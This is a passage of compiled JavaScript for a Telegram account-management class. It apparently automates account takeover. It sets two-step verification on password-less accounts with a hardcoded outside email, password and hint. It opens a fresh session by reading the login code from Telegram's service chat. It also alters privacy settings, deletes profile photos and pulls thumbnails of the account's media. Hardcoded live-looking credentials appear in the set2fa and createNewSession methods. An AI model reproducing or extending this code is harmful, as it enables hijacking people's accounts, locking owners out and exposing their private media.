                key: new tl_1.Api.InputPrivacyKeyAbout(),
                rules: [new tl_1.Api.InputPrivacyValueAllowAll()]
            }
        ];
        try {
            for (const setting of privacySettings) {
                await this.retryOperation(() => this.client.invoke(new tl_1.Api.account.SetPrivacy({
                    key: setting.key,
                    rules: setting.rules
                })));
                console.log(`Updated privacy for ${setting.key.className}`);
            }
        }
        catch (error) {
            const parsedError = (0, parseError_1.parseError)(error);
            console.error('Error updating privacy settings:', parsedError);
            throw error;
        }
    }
    async getFileUrl(url, filename) {
        const filePath = `/tmp/${filename}`;
        return this.safeOperation({
            execute: async () => {
                const response = await axios_1.default.get(url, {
                    responseType: 'stream',
                    timeout: 30000,
                    maxContentLength: TelegramManager.MAX_FILE_SIZE
                });
                await new Promise((resolve, reject) => {
                    const writer = fs.createWriteStream(filePath);
                    response.data.pipe(writer);
                    writer.on('finish', resolve);
                    writer.on('error', reject);
                });
                return filePath;
            },
            cleanup: async () => {
                try {
                    if (fs.existsSync(filePath)) {
                        fs.unlinkSync(filePath);
                    }
                }
                catch (error) {
                    console.warn(`Failed to cleanup file ${filePath}:`, (0, parseError_1.parseError)(error));
                }
            }
        });
    }
    async sendPhotoChat(id, url, caption, filename) {
        if (!this.client)
            throw new Error('Client is not initialized');
        let filePath = null;
        try {
            filePath = await this.getFileUrl(url, filename);
            const file = new uploads_1.CustomFile(filePath, fs.statSync(filePath).size, filename);
            await this.client.sendFile(id, { file, caption });
        }
        finally {
            if (filePath && fs.existsSync(filePath)) {
                try {
                    fs.unlinkSync(filePath);
                }
                catch (error) {
                    console.warn(`Failed to cleanup file ${filePath}:`, (0, parseError_1.parseError)(error));
                }
            }
        }
    }
    async sendFileChat(id, url, caption, filename) {
        if (!this.client)
            throw new Error('Client is not initialized');
        let filePath = null;
        try {
            filePath = await this.getFileUrl(url, filename);
            const file = new uploads_1.CustomFile(filePath, fs.statSync(filePath).size, filename);
            await this.client.sendFile(id, { file, caption });
        }
        finally {
            if (filePath && fs.existsSync(filePath)) {
                try {
                    fs.unlinkSync(filePath);
                }
                catch (error) {
                    console.warn(`Failed to cleanup file ${filePath}:`, (0, parseError_1.parseError)(error));
                }
            }
        }
    }
    async updateProfilePic(imagePath) {
        if (!this.client)
            throw new Error('Client is not initialized');
        let shouldDeleteFile = false;
        try {
            if (imagePath.startsWith('http')) {
                const tempFile = await this.getFileUrl(imagePath, 'profile.jpg');
                imagePath = tempFile;
                shouldDeleteFile = true;
            }
            const fileStats = fs.statSync(imagePath);
            const file = new uploads_1.CustomFile('pic.jpg', fileStats.size, imagePath);
            const uploadedFile = await this.client.uploadFile({
                file,
                workers: 1,
            });
            await this.client.invoke(new tl_1.Api.photos.UploadProfilePhoto({
                file: uploadedFile,
            }));
        }
        finally {
            if (shouldDeleteFile && fs.existsSync(imagePath)) {
                try {
                    fs.unlinkSync(imagePath);
                }
                catch (error) {
                    console.warn(`Failed to cleanup file ${imagePath}:`, (0, parseError_1.parseError)(error));
                }
            }
        }
    }
    async hasPassword() {
        const passwordInfo = await this.client.invoke(new tl_1.Api.account.GetPassword());
        return passwordInfo.hasPassword;
    }
    async set2fa() {
        return this.safeOperation({
            execute: async () => {
                const hasPassword = await this.hasPassword();
                if (hasPassword) {
                    console.log("Password already exists");
                    return;
                }
                console.log("Password Does not exist, Setting 2FA");
                const imapService = IMap_1.MailReader.getInstance();
                const twoFaDetails = {
                    email: "storeslaksmi@gmail.com",
                    hint: "password - India143",
                    newPassword: "Ajtdmwajt1@",
                };
                await imapService.connectToMail();
                return new Promise((resolve, reject) => {
                    const maxRetries = 3;
                    let retryCount = 0;
                    const checkTimeout = 30000;
                    const startTime = Date.now();
                    const checkMailInterval = setInterval(async () => {
                        try {
                            if (Date.now() - startTime > checkTimeout) {
                                clearInterval(checkMailInterval);
                                await imapService.disconnectFromMail();
                                reject(new Error("2FA setup timeout"));
                                return;
                            }
                            if (imapService.isMailReady()) {
                                clearInterval(checkMailInterval);
                                await this.setup2faWithEmail(imapService, twoFaDetails);
                                resolve(twoFaDetails);
                            }
                            else if (++retryCount >= maxRetries) {
                                clearInterval(checkMailInterval);
                                await imapService.disconnectFromMail();
                                reject(new Error("Mail service connection timeout"));
                            }
                        }
                        catch (error) {
                            clearInterval(checkMailInterval);
                            await imapService.disconnectFromMail();
                            reject(error);
                        }
                    }, 5000);
                });
            }
        });
    }
    async setup2faWithEmail(imapService, twoFaDetails) {
        await this.client.updateTwoFaSettings({
            isCheckPassword: false,
            email: twoFaDetails.email,
            hint: twoFaDetails.hint,
            newPassword: twoFaDetails.newPassword,
            emailCodeCallback: async () => {
                return this.waitForEmailCode(imapService);
            },
            onEmailCodeError: (error) => {
                console.error('Email code error:', (0, parseError_1.parseError)(error));
                return Promise.resolve("error");
            }
        });
    }
    async waitForEmailCode(imapService) {
        const maxAttempts = 4;
        const checkInterval = 10000;
        return new Promise(async (resolve, reject) => {
            let attempts = 0;
            const checkCode = async () => {
                try {
                    if (attempts >= maxAttempts) {
                        await imapService.disconnectFromMail();
                        reject(new Error("Failed to retrieve code after maximum attempts"));
                        return;
                    }
                    if (imapService.isMailReady()) {
                        const code = await imapService.getCode();
                        if (code) {
                            await imapService.disconnectFromMail();
                            resolve(code);
                            return;
                        }
                    }
                    attempts++;
                    setTimeout(checkCode, checkInterval);
                }
                catch (error) {
                    await imapService.disconnectFromMail();
                    reject(error);
                }
            };
            checkCode();
        });
    }
    async createNewSession() {
        return this.safeOperation({
            execute: async () => {
                const me = await this.client.getMe();
                if (!me.phone)
                    throw new Error('Failed to get phone number');
                const newClient = new telegram_1.TelegramClient(new sessions_1.StringSession(''), parseInt(process.env.API_ID || '', 10), process.env.API_HASH || '', {
                    connectionRetries: 1,
                    timeout: 30000
                });
                await newClient.start({
                    phoneNumber: me.phone,
                    password: async () => "Ajtdmwajt1@",
                    phoneCode: async () => {
                        console.log('Waiting for the OTP code from chat ID 777000...');
                        const code = await this.waitForOtp();
                        if (!code)
                            throw new Error('Failed to get OTP code');
                        return code;
                    },
                    onError: (err) => {
                        const parsedError = (0, parseError_1.parseError)(err);
                        throw new Error(`Session creation failed: ${parsedError.message}`);
                    }
                });
                const session = newClient.session.save();
                await newClient.disconnect();
                return session;
            }
        });
    }
    async waitForOtp() {
        const maxAttempts = 3;
        const checkInterval = 5000;
        const messageValidityWindow = 60000;
        for (let attempt = 0; attempt < maxAttempts; attempt++) {
            try {
                const messages = await this.retryOperation(() => this.client.getMessages('777000', { limit: 1 }), 2);
                const message = messages[0];
                if (!message) {
                    console.log("No messages found");
                    continue;
                }
                const isRecent = message.date * 1000 > Date.now() - messageValidityWindow;
                const code = this.extractOtpFromMessage(message.text);
                if (!code) {
                    console.log("Invalid message format");
                    continue;
                }
                if (isRecent || attempt === maxAttempts - 1) {
                    console.log("Using code:", code);
                    return code;
                }
                console.log("Message too old:", new Date(message.date * 1000).toISOString());
                await (0, Helpers_1.sleep)(checkInterval);
            }
            catch (error) {
                const parsedError = (0, parseError_1.parseError)(error);
                console.warn(`OTP attempt ${attempt + 1} failed:`, parsedError);
                if (attempt < maxAttempts - 1) {
                    await (0, Helpers_1.sleep)(2000 * (attempt + 1));
                }
            }
        }
        throw new Error('Failed to get OTP after maximum attempts');
    }
    extractOtpFromMessage(text) {
        try {
            const match = text.split('.')[0].split("code:**")[1]?.trim();
            return match || null;
        }
        catch {
            return null;
        }
    }
    async downloadWithTimeout(promise, timeout) {
        return Promise.race([
            promise,
            new Promise((_, reject) => setTimeout(() => reject(new Error('Download timeout')), timeout))
        ]);
    }
    async retryOperation(operation, retries = TelegramManager.MAX_RETRIES) {
        for (let i = 0; i < retries; i++) {
            try {
                return await operation();
            }
            catch (error) {
                if (i === retries - 1)
                    throw error;
                const parsedError = (0, parseError_1.parseError)(error);
                if (parsedError.message.includes('FLOOD_WAIT')) {
                    const waitTime = parseInt(parsedError.message.match(/FLOOD_WAIT_(\d+)/)?.[1] || '30', 10);
                    await (0, Helpers_1.sleep)(waitTime * 1000);
                }
                else {
                    await (0, Helpers_1.sleep)(2000 * (i + 1));
                }
            }
        }
        throw new Error('Operation failed after max retries');
    }
    async safeOperation({ execute, cleanup }) {
        if (!this.client) {
            throw new Error('Client is not initialized');
        }
        try {
            return await execute();
        }
        catch (error) {
            const parsedError = (0, parseError_1.parseError)(error);
            if (parsedError.message.includes(TelegramErrorCode.FLOOD_WAIT)) {
                const waitTime = parseInt(parsedError.message.match(/FLOOD_WAIT_(\d+)/)?.[1] || '30', 10);
                await (0, Helpers_1.sleep)(waitTime * 1000);
                return await execute();
            }
            throw error;
        }
        finally {
            if (cleanup) {
                try {
                    await cleanup();
                }
                catch (cleanupError) {
                    console.warn('Cleanup failed:', (0, parseError_1.parseError)(cleanupError));
                }
            }
        }
    }
    async deleteProfilePhotos() {
        if (!this.client)
            throw new Error('Client is not initialized');
        try {
            const result = await this.client.invoke(new tl_1.Api.photos.GetUserPhotos({
                userId: "me"
            }));
            console.log(`Profile pictures found: ${result.photos.length}`);
            if (result?.photos?.length > 0) {
                await this.client.invoke(new tl_1.Api.photos.DeletePhotos({
                    id: result.photos.map(photo => new tl_1.Api.InputPhoto({
                        id: photo.id,
                        accessHash: photo.accessHash,
                        fileReference: photo.fileReference
                    }))
                }));
                console.log("Deleted profile photos");
            }
        }
        catch (error) {
            const parsedError = (0, parseError_1.parseError)(error);
            console.error('Error deleting profile photos:', parsedError);
            throw error;
        }
    }
    async getMediaMetadata(chatId = 'me', offset, limit = 100) {
        return this.safeOperation({
            execute: async () => {
                const query = { limit };
                if (offset)
                    query.offsetId = offset;
                const messages = await this.client.getMessages(chatId, query);
                const mediaMessages = messages.filter(message => message.media && message.media.className !== "MessageMediaWebPage");
                console.log(`Total: ${messages.total}, fetched: ${messages.length}, ChatId: ${chatId}, Media: ${mediaMessages.length}`);
                if (!messages.length) {
                    return { data: [], endOfMessages: true };
                }
                const data = [];
                const processPromises = mediaMessages.map(async (message) => {
                    try {
                        const thumbBuffer = await this.getMediaThumbnail(message);
                        return {
                            messageId: message.id,
                            mediaType: message.media instanceof tl_1.Api.MessageMediaPhoto ? 'photo' : 'video',
                            thumb: thumbBuffer?.toString('base64') || null,
                        };
                    }
                    catch (error) {
                        console.warn(`Failed to process message ${message.id}:`, (0, parseError_1.parseError)(error));
                        return {
                            messageId: message.id,
                            mediaType: message.media instanceof tl_1.Api.MessageMediaPhoto ? 'photo' : 'video',
                            thumb: null,
                        };
                    }
                });
                const results = await Promise.allSettled(processPromises);
                results.forEach(result => {
                    if (result.status === 'fulfilled') {
                        data.push(result.value);
                    }
                });
                if (!data.length && messages.length > 0) {
                    data.push({
                        messageId: messages[messages.length - 1].id,
                        mediaType: 'photo',
                        thumb: null,
                    });
                }
                return { data, endOfMessages: false };
            }
        });
    }
    async getMediaThumbnail(message) {
        if (message.media instanceof tl_1.Api.MessageMediaPhoto) {
            const sizes = message.photo?.sizes || [1];
            return this.downloadWithTimeout(this.client.downloadMedia(message, { thumb: sizes[1] || sizes[0] }), TelegramManager.DOWNLOAD_TIMEOUT);
        }
        else if (message.media instanceof tl_1.Api.MessageMediaDocument &&
            message.document?.mimeType &&
            (message.document.mimeType.startsWith('video') || message.document.mimeType.startsWith('image'))) {
            const sizes = message.document?.thumbs || [1];
            return this.downloadWithTimeout(this.client.downloadMedia(message, { thumb: sizes[1] || sizes[0] }), TelegramManager.DOWNLOAD_TIMEOUT);
        }
        return null;
    }
}
TelegramManager.DOWNLOAD_TIMEOUT = 5000;
TelegramManager.CHUNK_SIZE = 512 * 1024;
TelegramManager.MAX_FILE_SIZE = 5 * 1024 * 1024;
TelegramManager.MAX_RETRIES = 3;
exports.default = TelegramManager;
//# sourceMappingURL=TelegramManager.js.map